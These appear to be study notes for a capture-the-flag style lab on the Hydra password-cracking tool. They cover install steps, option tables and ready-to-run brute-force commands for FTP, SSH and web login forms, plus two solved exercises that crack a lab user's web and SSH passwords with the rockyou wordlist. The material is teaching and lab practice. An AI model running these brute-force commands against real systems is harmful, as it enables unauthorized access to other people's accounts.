
# What is Hydra?

Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.

Hydra can run through a list and “brute force” some authentication services. Imagine trying to manually guess someone’s password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.

According to its official repository, Hydra supports, i.e., has the ability to brute force the following protocols: “Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.”

For more information on the options of each protocol in Hydra, you can check the [Kali Hydra tool page](https://tools.kali.org/password-attacks/hydra).

This shows the importance of using a strong password; if your password is common, doesn’t contain special characters and is not above eight characters, it will be prone to be guessed. A one-hundred-million-password list contains common passwords, so when an out-of-the-box application uses an easy password to log in, change it from the default! CCTV cameras and web frameworks often use admin:password as the default login credentials, which is obviously not strong enough.

## Installing Hydra

Hydra is already installed on the AttackBox. You can access it by clicking on the Start AttackBox button.

If you prefer to use the in-browser Kali machine, Hydra also comes pre-installed, as is the case with all Kali distributions. You can access it by selecting Use Kali Linux and clicking on Start Kali Linux button.

However, you can check its official repositories if you prefer to use another Linux distribution. For instance, you can install Hydra on an Ubuntu or Fedora system by executing:

- **Ubuntu:** `apt install hydra`
- **Fedora:** `dnf install hydra`

Furthermore, you can download it from its official [THC-Hydra repository](https://github.com/vanhauser-thc/thc-hydra).


# Hydra Commands

## Brute Force FTP Example
```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

## Hydra on SSH
```bash
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```
### Options
| Option | Description |
|--------|-------------|
| `-l`   | Specifies the (SSH) username for login |
| `-P`   | Indicates a list of passwords |
| `-t`   | Sets the number of threads to spawn |

**Example:**
```bash
hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh
```
- **`root`** is used as the SSH username.
- Passwords are tried from `passwords.txt`.
- Four threads will run in parallel (`-t 4`).

---

## Hydra on Web Form (POST Method)
```bash
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```

### Options
| Option              | Description                                                                 |
|---------------------|-----------------------------------------------------------------------------|
| `-l`                | The username for (web form) login                                           |
| `-P`                | The password list to use                                                   |
| `http-post-form`    | Specifies the form type as POST                                             |
| `<path>`            | The login page URL, e.g., `login.php`                                      |
| `<login_credentials>` | Login fields, e.g., `username=^USER^&password=^PASS^`                     |
| `<invalid_response>` | Part of the response indicating a failed login attempt, e.g., "incorrect". |
| `-V`                | Verbose output for every attempt                                           |

**Example:**
```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
- **Login page**: `/` (main page, no specific path).
- **Form fields**: `username` and `password`.
- The string `F=incorrect` appears in the server response for failed login attempts.

 Ejercicio1 Use Hydra to bruteforce molly's web password. What is flag 1?

hydra -l molly -P /usr/share/wordlists/rockyou.txt   10.10.18.174 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V

Ejercicio2 Use Hydra to bruteforce molly's SSH password. What is flag 2?

└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt   10.10.18.174 ssh                                                                                                 
└─$ ssh molly@10.10.18.174    
Poner la pass 
Y buscar la flag
